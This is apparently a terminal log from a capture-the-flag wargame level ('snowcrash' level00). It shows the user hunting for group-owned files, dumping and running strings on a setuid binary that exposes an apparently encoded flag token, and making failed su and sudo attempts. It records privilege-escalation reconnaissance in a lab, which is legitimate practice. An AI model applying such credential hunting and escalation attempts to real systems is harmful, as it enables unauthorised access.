/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.events.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.swap.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.swap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.swap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.zswap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.swap.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.max.descendants
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cpu.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/pids.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/pids.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.low
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cpu.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.type
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.swap.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cpu.stat.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.threads
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.numa_stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.kill
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.freeze
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.min
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.controllers
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.oom.group
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.zswap.writeback
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/pids.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.zswap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.subtree_control
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.reclaim
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/pids.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.max.depth
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.freeze
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.min
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.max.burst
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.controllers
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.oom.group
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.zswap.writeback
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.uclamp.min
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/pids.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.zswap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.subtree_control
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.reclaim
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/pids.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.max.depth
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.uclamp.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/io.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.events.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.swap.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.swap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.swap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.zswap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.weight
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.swap.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.max.descendants
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.weight.nice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/pids.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/pids.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.low
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.type
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.swap.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.idle
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.stat.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.threads
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.numa_stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.kill
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.freeze
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.min
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.max.burst
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.controllers
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.oom.group
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.zswap.writeback
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.uclamp.min
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/pids.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.zswap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.subtree_control
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/memory.reclaim
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/pids.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.max.depth
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope/cpu.uclamp.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/memory.oom.group
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/cgroup.subtree_control
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/memory.reclaim
/home/level00
/home/level00/README
/home/level00/.bashrc
/home/level00/.bash_history
/home/level00/.cache
/home/level00/.cache/motd.legal-displayed
/home/level00/.bash_logout
/home/level00/.profile
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ find / -group level00 2>/dev/null | grep -v '/proc\|/sys\|/run'
/home/level00
/home/level00/README
/home/level00/.bashrc
/home/level00/.bash_history
/home/level00/.cache
/home/level00/.cache/motd.legal-displayed
/home/level00/.bash_logout
/home/level00/.profile
/opt/snowcrash/level00/hiro
level00@snowcrash:~$ cat /opt/snowcrash/level00/hiro
@ @@@�����000L�\�\p
                  �L�\�\�8880hhhDDS�td8880P�td\F\F\F��Q�tdR�td�L�\�\XX/lib64/ld-linux-x86-64.so.2 GNU���GNU��eNa%
                                                                                                                 ��'��>G�BQ5�GGNU(��(*(��e�mfUa9���\ �
c�J�;�����x S?�4�qE�Dz/	� \�"�fgetssnprintfstdinstrncpy__stack_chk_failexitfflushdifftimefopengetpwuidgetgrnamusleepgetpidstdoutstrftimeatoistrcspn__libc_start_mainstderrctermidfprintf__cxa_finalizelocaltimegetgidfclosememsetfputcfputs__isoc99_ss;���Eu�iidgeP��`�_�_�_�_&�_) `(0`*@`+�^�^�^�^�^��^.6�^IBC_2.7GLIBC_2.4GLIBC_2.34GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable'ii
_
_
_ _(_0_8_@_H_P_X_`_h_p_�x__�_�_�_�_ �_!�_"�_#�_$�_%�_'��H�H��OH��t��H���5�N�%�N@��h�����f���h�����f���h�����f���h����f���h����f���h����f���h����f���h�r���f����b���f���h	�R���f���h
�B���f���h
          �2���f���h
����f���h����f���h�����f���h�����f���h�����f���h�����f���h����f���h����f���h����f���h����f���h�r���f���h�b���f���h�R���f���h��B���f���h2���f���h�"���f���h����f���h����f���h�����f���h �����f���h!�����f���h"�����f����%�MfD���%FLfD���%>LfD���%6LfD���%.LfD���%&LfD���%LfD���%LfD���%LfD���%LfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%�KfD���%~KfD���%vKfD���%nKfD���%fKfD���%^KfD���%VKfD���%NKfD���%FKfD���%>KfD���%6KfD��1�I��^H��H���PTE1�1�H�=��K�f.�H�=AKH�:KH9�tH��JH��t	�����H�=KH�5
KH)�H��H��?H��H�H��tH��JH����fD�����=�Ju+UH�=�JH��t
                                                   H�=�J������d�����J]������w�����UH��}���J�]���UH��H��H�}�H�E��@��t'H�E�H��`���AH�Ǹ�U����/J������UH��SH��hH������dH�%(H�E�1���I���%H������H�@H������H������H���5���H������H������H������H��H��� H������H������L�@\H�������HH������H���H������H�pH�������@A��H�������@A��H�������@
                                                                            ��H������D�H������H������APQWVASAQA��E��H��H�L�H�Ǹ�"���H��0������������~/�������#������HcЋ�HH������H�Ή��s�����H�E�dH+%(t����H�]�����UH��H��H����H�����dH�%(H�E�1�H��������H����������H����������H�����H����������H�����@�� ���H�������$���H�����@(��(���H����H�H4H�����H���?H��H���X���H����H�HtH�����H��?H��H���0���H�����H�����H�J\�?H��H������H�����H���e����H�E�dH+%(t�Z�������UH��jG��x�`G�������OG�����]���UH��H��H�
                                  $H�ĀH������dH�%(H�E�1�H������H���`H�2H�0��H�H���H�H�H�v�H�w�H�H���H)�H)�����������H��H���H��H�E�dH+%(t��������UH��H���H�����H�����dH�%(H�E�1�H�����H�G'H��H������H��(���H��(���u
������ǅ$����������<#��������<
��H��p���H��0���H������H�5�&H�Ǹ��������kH��0���H��&H��H���i�����uH��p���H������H�������%H��0���H��&H��H���/�����uH��p���H�������H������B��H��0���H�c&H��H���������uH��p���H������H�������H��0���H�8&H��H��������u��p���H���f���H������B�wH��0���H�
                                    &H��H��������u��p���H���.���H������B�?H��0���H��%H��H���I�����u"H�����H�H`H��p�����H��H��������$�������H��(���H�������H�������H��� ���H��(���H��������$���H�U�dH+%(t��������UH��}��E���]���UH��H�� �}�u�H�U��E��������E�U�H��H��H�H�H�H��H��EH�H�E�H�E��U�H�E��U�P�����H�U�H�H�E��@H�E�H�HH�E�?H��H�����������UH��SH��(�}�H�uЋE܉��8����E�U�H��H��H�H�H�H��H�>EH�H�E�H�E�@��t
                                                                                                                  H�E�9E�t
������H�E�H�������H��H���
 )v������jH�}�t^H�E�H�U�H�
H�HH�H�JH�ZH�HH�XH�J H�Z(H�H H�X(H�J0H�Z8H�H0H�X8H�J@H�ZHH�H@H�XHH�RPH�PP�H�]�����UH��H��0�}܉u؉UԋE܉��)����E�U�H��H�H�H��H��BH�H�E������H�E�H�E��9E�u0H�E�H�H�E�H��H������fH~�f���*E�fHn�f/�r+H�E��U܉H�E�H�U�H�H�E��@H�E��@H�E��@�PH�E��PH�E��@9E�}H�E��!H��H���������u�����������UH��H��0�}�H�uЉU؃}�u]���UH��SH��(H�}�H�u�H�E�H�X������H��H���3���fH~�H�E�H�EЋf���*��E�f/�v�������H�]�����UH��H��H�}�H�u�H�E��@t��u������kH�E��@��u��YH�E�H��t�	H�
���H�E�H�������H�E�H�}�u
�������E܉������H�E�H�}�u
������H�E��PH�E��@9�u��qH�E�H�@H��t_�E��9H�E�H�H�E�H�@�M�Hc�H��H�H�H��H���;�����u��&�E�H�E�H�@�U�Hc�H��H�H�H��u����������UH��H�� �E�H��FH��H��FH��FH��v`��F�E�H��FH��x
�E��kF�����H�bF�����UH��H�0FH��H�%F�]���UH��H�#FH��H�F�]���UH��H��0H������dH�%(H�E�1�H��������H������H�H����H������H�H H������H�pH������L�@H������H�H������H�H������H�VfHn�M��I��H��H�0�H�Ǹ�����H��������������~-��=��x#������HcЋ�=H������H�Ή��A�����H�E�dH+%(t�j�������UH��H�ĀH�}�H�u�dH�%(H�E�1�H�E����H�������:���H�U������H�U��B����H�U���'���H�U��B
                                                                                                  ������H�U�H�BH�E�H�PH�E�H�P H�E��H�E��P,�����B=�<=H�E��P������H�E�H�}�tH�E�H�HtH�E��?H��H������H�E��H�U�H�։�������u"H�E�H��4H�U�H�J�?H��H��������TH�E�����1���H�E�H�}�t<H�E�H�H�U�H�J4�?H��H������H�E�H�H�E��H�E���Ή�������H�E�dH+%(t���������UH��H��H�}�H�<H�E�H��H�������H�<H�ƿ
�)����L�����������UH��H��0H������H������dH�%(H�E�1�H�H������H��;H����HH���������������H�\;H���'�H��H��������I����ǅ�����H������H������H��H��������ySH�;H����H��H���G���H������H����H�����H�7BH��H�,B�`H��:H������H��H������H��:H���_���H��:H�������H�������H���H������H�HH��H������Ƅ����������H������H�B �v���H������H�H��H��������uH���������H������H�H��H���f�����uHH���S����]H������H����H���5�����uH�����"����,H������H����H��������tH������H����H���������uH�����������H������H����H��������uH���������H���H�Ǹ�9�����6����6H�������P��������69�}�����t:H������H����H���������tH������H����H��������uH��������ǅ�����H������H����H��������u H�����m���H�����^����kH���������t]H��6H������H�
��6������t��6���3������H�E�dH+%(t��������UH��}��}�u���}��v�}���w���]���UH��H�}�H�}�t
�}�.t������H�E�H�U�H�E�H����u��]���UH��H��H�                                        H�E����u������tH�E��SH�U�H�E�H���E��}�`~�}�z~1�}�@~�}�Z~%�}�/~�}�9~�}�_t�}�-t
                                            $H��PdH�%(H�E�1�H������H�������H������H��H�*�H���Z���H������H������H��H���j���H������H���t���H������H���E�����yH��H��������������������u-�����H������H��H��H�������H��H������H������H��4H���x�����y-����H������H��H��H������H��H���<����������������������Ή�������y-�T���H������H��H��H���L���H��H�������������������H������H�� H�Ή��h�����y-����H������H��H��H�������H��H������H������H������H��H������H������H��H��H������H������H������H������H������H��H������������H������H������H������H��H��������y������H�H��H���K����H������H�
                                                                       H��H���0���H������H������H��H�������fH~�H������H������fHn��8���H�:H�������$����H�U�dH+%(t�c�������H�H��%Y-%m-%dT%H:%M:%S%s seq=%u uid=%d euid=%d gid=%d user=%s term=%s retries=%d event=%s
,<xflag00/var/log/snowcrash/hiro.logr%63[^=]=%127sversionmax_retriessession_timeoutrate_limitaudit_enabledlog_path/dev/pts//dev/ttyMETRICS sessions=%llu denials=%llu timeouts=%llu commands=%llu avg_secs=%.2f
flag00@snowcrash:~$ [*] Checking credentials...
[*] Access granted — welcome, flag00

Session timeout.

iduid=3000(flag00) gid=3000(flag00) groups=3000(flag00)whoamiflag00hostnameSnowCrashuname -aunameLinux SnowCrash 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linuxpwd/home/flag00envSHELL=/bin/bashHOME=/home/flag00USER=flag00LOGNAME=flag00PATH=/usr/local/bin:/usr/bin:/binTERM=xterm-256colorlstotal 12drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hirocatcat: permission deniedsudosudo: sorry, you must have a tty to run sudosusu: Authentication failureexitquitlogouthelpGNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)Type 'help' to see this list.%s: command not found
/etc/snowcrash/hiro.conferror: policy version mismatchdenied_uid_rangeerror: uid not permitteddenied_username_invaliderror: invalid usernamedenied_rate_limiterror: rate limit exceededdenied_grouperror: group membership check failedsession_startsession_end>@f2av5il02puano7naaf6adaf3a�����$���L���dD���
                                                       -���|E��������������<���h��� ���@}���`�����'����5����%����O�������(J���H<���h�����
����'����,�����������$����D����dW����zRx
                                       0���&D$4����@FJ
O                                                     �?�9*3$"\����t����0�����E�C
|����EE�C
H�c���tE�C
5 ����>E�C
c���,E�C
�@����E�C
q����zE�C
J���E�C
����E�C
E����E�C
��i����E�C
a9���*E�C
E�Y��gE�C
� 8�����E�C
������E�C
������E�C
T]���E�C
TZ���E�C
�W���E�C
|<����E�C
������E�C
o8���8E�C
�P����E�C
������E�C
�@'
�-��������
�
 �^H`
     X
������o
���o���o�	���o�\0@P`p�������� 0@P`p�������� 0@`����GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0��	� ��� 3@I`U�\|���\����@F`�`��`�`�`��`
$I�V$���)8�*����K����\�\F��^�<Pd � �`F�����`����-EWj�~����`��� �`*=Pjg��&o���*���������` *"E
                                                                                            K^Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryhiro.cflag_datag_shutdown_flagg_audit_seqg_audit_fdg_retry_countg_session_pidg_policy_levelg_rate_tableg_cred_cachehandle_sigtermopen_auditwrite_audit_recordaudit_eventclose_auditload_default_policyparse_policy_fileuid_hashcache_credentialslookup_cached_credsrate_checkcheck_policy_versioncheck_session_timeoutcheck_terminalverify_group_membershipg_metricsmetrics_record_sessionmetrics_record_denialmetrics_record_commandmetrics_emitinit_contextfatalrun_restricted_shellvalidate_uid_rangevalidate_username_chars__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE_localtime@GLIBC_2.2.5__libc_start_main@GLIBC_2.34strncpy@GLIBC_2.2.5strncmp@GLIBC_2.2.5_ITM_deregisterTMCloneTablestdout@GLIBC_2.2.5stdin@GLIBC_2.2.5getpid@GLIBC_2.2.5_edatafclose@GLIBC_2.2.5getpwuid@GLIBC_2.2.5_fini__stack_chk_fail@GLIBC_2.4getuid@GLIBC_2.2.5difftime@GLIBC_2.2.5snprintf@GLIBC_2.2.5fputs@GLIBC_2.2.5memset@GLIBC_2.2.5geteuid@GLIBC_2.2.5fputc@GLIBC_2.2.5strcspn@GLIBC_2.2.5fgets@GLIBC_2.2.5__data_startstrcmp@GLIBC_2.2.5fprintf@GLIBC_2.2.5__gmon_start____dso_handlegetgrnam@GLIBC_2.2.5_IO_stdin_usedgetgid@GLIBC_2.2.5fflush@GLIBC_2.2.5__isoc99_sscanf@GLIBC_2.7_endgetegid@GLIBC_2.2.5__bss_startmainstrftime@GLIBC_2.2.5ctermid@GLIBC_2.2.5fopen@GLIBC_2.2.5atoi@GLIBC_2.2.5exit@GLIBC_2.2.5fwrite@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTable__cxa_finalize@GLIBC_2.2.5_initusleep@GLIBC_2.2.5stderr@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.flag_data.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886hh$I�� W���o��a
                                                                                                                                                                                                             �q���o�	�	X~���o

�X
X
�B`
   `
�00@ �@F@F\F\F��PGPG����\�L��^� `P� 0P-HP
4PZq�`%level00@snowcrstrings /opt/snowcrash/level00/hiro00/hiro
/lib64/ld-linux-x86-64.so.2
eNa%
mfUa
fgets
snprintf
stdin
strncpy
__stack_chk_fail
exit
fflush
difftime
fopen
getpwuid
getgrnam
usleep
getpid
stdout
strftime
atoi
strcspn
__libc_start_main
stderr
ctermid
fprintf
__cxa_finalize
localtime
getgid
fclose
memset
fputc
fputs
__isoc99_sscanf
getuid
getegid
fwrite
strcmp
strncmp
geteuid
libc.so.6
GLIBC_2.7
GLIBC_2.4
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
APQWVASAQA
%Y-%m-%dT%H:%M:%S
%s seq=%u uid=%d euid=%d gid=%d user=%s term=%s retries=%d event=%s
flag00
/var/log/snowcrash/hiro.log
%63[^=]=%127s
version
max_retries
session_timeout
rate_limit
audit_enabled
log_path
/dev/pts/
/dev/tty
METRICS sessions=%llu denials=%llu timeouts=%llu commands=%llu avg_secs=%.2f
flag00@snowcrash:~$ 
[*] Checking credentials...
[*] Access granted 
 welcome, flag00
Session timeout.
uid=3000(flag00) gid=3000(flag00) groups=3000(flag00)
whoami
flag00
hostname
SnowCrash
uname -a
uname
Linux SnowCrash 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux
/home/flag00
SHELL=/bin/bash
HOME=/home/flag00
USER=flag00
LOGNAME=flag00
PATH=/usr/local/bin:/usr/bin:/bin
TERM=xterm-256color
total 12
drwxr-x--- 2 flag00 flag00 4096 Jan  1 00:00 .
drwxr-xr-x 22 root   root   4096 Jan  1 00:00 ..
-r-------- 1 flag00 flag00   32 Jan  1 00:00 .flag
-rwsr-x--- 1 flag00 level00  12288 Jan  1 00:00 hiro
cat: permission denied
sudo
sudo: sorry, you must have a tty to run sudo
su: Authentication failure
exit
quit
logout
help
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
Type 'help' to see this list.
%s: command not found
/etc/snowcrash/hiro.conf
error: policy version mismatch
denied_uid_range
error: uid not permitted
denied_username_invalid
error: invalid username
denied_rate_limit
error: rate limit exceeded
denied_group
error: group membership check failed
session_start
session_end
>@f2av5il02puano7naaf6adaf3a
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
hiro.c
flag_data
g_shutdown_flag
g_audit_seq
g_audit_fd
g_retry_count
g_session_pid
g_policy_level
g_rate_table
g_cred_cache
handle_sigterm
open_audit
write_audit_record
audit_event
close_audit
load_default_policy
parse_policy_file
uid_hash
cache_credentials
lookup_cached_creds
rate_check
check_policy_version
check_session_timeout
check_terminal
verify_group_membership
g_metrics
metrics_record_session
metrics_record_denial
metrics_record_command
metrics_emit
init_context
fatal
run_restricted_shell
validate_uid_range
validate_username_chars
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
localtime@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
stdin@GLIBC_2.2.5
getpid@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
getpwuid@GLIBC_2.2.5
_fini
__stack_chk_fail@GLIBC_2.4
getuid@GLIBC_2.2.5
difftime@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
fputc@GLIBC_2.2.5
strcspn@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
getgrnam@GLIBC_2.2.5
_IO_stdin_used
getgid@GLIBC_2.2.5
fflush@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
_end
getegid@GLIBC_2.2.5
__bss_start
main
strftime@GLIBC_2.2.5
ctermid@GLIBC_2.2.5
fopen@GLIBC_2.2.5
atoi@GLIBC_2.2.5
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
usleep@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.flag_data
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
level00@snowcrash:~$ ls -l /opt/snowcrash/level00/hiro
-r-sr-x--- 1 flag00 level00 27112 Jun  9 19:03 /opt/snowcrash/level00/hiro
level00@snowcrash:~$ chomd 777 /opt/snowcrash/level00/hiro
Command 'chomd' not found, did you mean:
  command 'chmod' from deb coreutils (9.4-3ubuntu6.2)
Try: apt install <deb name>
level00@snowcrash:~$ sudo apt install chmod
[sudo] password for level00: 
Sorry, try again.
[sudo] password for level00: 
Sorry, try again.
[sudo] password for level00: 
sudo: 2 incorrect password attempts
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ su flag00
Password: 
su: Authentication failure
level00@snowcrash:~$ cat /etc/snowcrash/hiro.conf
cat: /etc/snowcrash/hiro.conf: No such file or directory
level00@snowcrash:~$  /etc/snowcrash/hiro.conf
-bash: /etc/snowcrash/hiro.conf: No such file or directory
level00@snowcrash:~$ cat /etc/snowcrash
cat: /etc/snowcrash: No such file or directory
level00@snowcrash:~$ ls -la
total 32
drwxr-x---  3 level00 level00 4096 Sep 25 23:03 .
drwxr-xr-x 37 root    root    4096 Jun  9 19:04 ..
-rw-------  1 level00 level00  352 Sep 25 23:03 .bash_history
-rw-r--r--  1 level00 level00  220 Mar 31  2024 .bash_logout
-rw-r--r--  1 level00 level00 3771 Mar 31  2024 .bashrc
drwx------  2 level00 level00 4096 Sep 26  2026 .cache
-rw-r--r--  1 level00 level00  807 Mar 31  2024 .profile
-r--r--r--  1 level00 level00   66 Jun  9 19:03 README
